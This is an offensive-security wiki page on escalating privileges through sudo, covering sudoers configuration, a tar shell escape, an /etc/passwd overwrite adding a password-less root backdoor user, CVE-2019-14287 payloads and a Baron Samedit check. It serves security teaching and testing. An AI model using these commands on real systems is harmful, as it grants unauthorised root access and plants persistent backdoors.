---
authors: ShutdownRepo, dreamkinn, p0dalirius
category: infra
---

# SUDO

## Theory

`sudo` (Super User DO) is a program for UNIX-like computer operating systems that allows users to run programs with the security privileges of another user (by default, the superuser).

Unlike the similar command `su`, users must, by default, supply their own password for authentication, rather than the password of the target user. After authentication, and if the configuration file, which is typically located at `/etc/sudoers`, permits the user access, the system invokes the requested command with the target user's privileges.

Sudo users are called sudoers ( 😯 _I know right, big brains here_ 🧠 ). What sudoers are allowed to do is defined in the `/etc/sudoers` configuration file. This file, owned by `root`, is supposed to be 440 (read-only) and should only be edited with `visudo`, `sudoedit` or `sudo -e`.

![](./assets/sudoers_config.png)

## Practice

There are many ways to escalate privileges by exploiting `sudo`, either by profiting from insecure configuration, or by exploiting the program's vulnerabilities.

### Default configurations

The `sudo -l` command can be run by sudoers to check their sudo rights. The output reflects the `/etc/sudoers` configuration that applies to the user. It should like the following (default config for a new sudoer).

```bash
# Format is
User johnthesudoer may run the following commands on johncomputer:
 (ALL : ALL) ALL
```

For instance, this configuration allows the `johnthesudoer` user to run any privileged command as long as `johnthesudoer`'s password is known. A privileged session can be obtained with `sudo -i`, `sudo -s`, `sudo su` or `sudo `.

### Living off the land

While the SUDO configuration can be hardened to restrict privileged execution to specific program, there are some that can be abused to bypass local security restrictions. This is called [Living off the land](living-off-the-land.md).

```bash
User johnthesudoer may run the following commands on johncomputer:
 (ALL : ALL) /bin/tar
```

The configuration above only allows sudoer `johnthesudoer` to execute `/bin/tar` as root as long as `johnthesudoer`'s password is known. The thing is tar is program that can be used to obtain a full session, hence bypassing the restrictions induced by sudoers configuration.

```bash
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Other examples can be found on the [Living off the land](living-off-the-land.md) note.

While some programs can be used to obtain a full shell, others can be used to induce changes on the system to grant root privileges, like `/usr/bin/cp`. The following commands are used to edit the `/etc/passwd` file to add a password-less user with `root`'s uid and gid.

```bash
cp /etc/passwd /tmp/passwd.bak
echo "backdoorroot::0:0:Backdoor root:/root:/bin/bash" >> /tmp/passwd.bak
sudo /usr/bin/cp passwd.bak /etc/passwd
su -l backdoorroot
```

### CVE-2019-14287 (#-1)

With SUDO running version < 1.8.28, an attacker in control of a "runas ALL" sudoer account can bypass certain policy blacklists and session PAM modules by invoking sudo with a crafted user ID. 

Exploiting the bug requires sudo privileges and being able to run commands with an arbitrary user ID. This means the user's sudoers entry has to have the special value `ALL` in the "runas" specifier (the yellow and green parts in [the doodle above](sudo.md#theory)).

Vulnerable users can be found with the two commands below

```bash
grep -e '(\s*ALL\s*,\s*!root\s*)' /etc/sudoers
grep -e '(\s*ALL\s*,\s*\!#0\s*)' /etc/sudoers
```

The vulnerability can be exploited with one of the following payloads

```bash
sudo -u#-1 sh -p
sudo -u#4294967295 sh -p
sudo -u#$((0xffffffff)) sh -p
```

> [!TIP]
> Some technical details to the vulnerability
> 
> Sudo uses the `setresuid(2)` and `setreuid(2)` system calls to change the user ID before running the command. So if you try to enter a negative user id `-1` (or its 32-bit unsigned equivalent `4294967295`), `setresuid(2)` and `setreuid(2)` cannot set a negative user id and you're left with the user id sudo is running with : `0`.
> 
> Therefore `sudo -u#-1 id -u` or `sudo -u#4294967295 id -u` will actually return `uid=0` and run command as root.
> 
> More info can be found [here](https://nvd.nist.gov/vuln/detail/CVE-2019-14287)

### CVE-2021-3156 (Baron Samedit)

With SUDO running version < 1.9.5p2, a Heap-based Buffer Overflow allows for privilege escalation to root via `sudoedit -s` and a command-line argument that ends with a single backslash character. To test if a system is vulnerable or not, the following command can be run as a non-root user.

```bash
sudoedit -s /
```

Patched versions will throw a `usage:` help message while vulnerable ones will throw the following `sudoedit:` error.

```
$ sudoedit -s /
[sudo] password for user: 
sudoedit: /: not a regular file
```

This vulnerability can be exploited with [this exploit](https://github.com/r4j0x00/exploits/tree/master/CVE-2021-3156_one_shot), or [this one](https://github.com/worawit/CVE-2021-3156).

More info about this vulnerability can be found [here](https://nvd.nist.gov/vuln/detail/CVE-2021-3156) and [here](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit).

## Resources

[https://gtfobins.github.io/#+sudo](https://gtfobins.github.io/#+sudo)

[https://jamesluo-843.medium.com/exploiting-cve-2019-14287-37eac7023a4](https://jamesluo-843.medium.com/exploiting-cve-2019-14287-37eac7023a4)

[https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)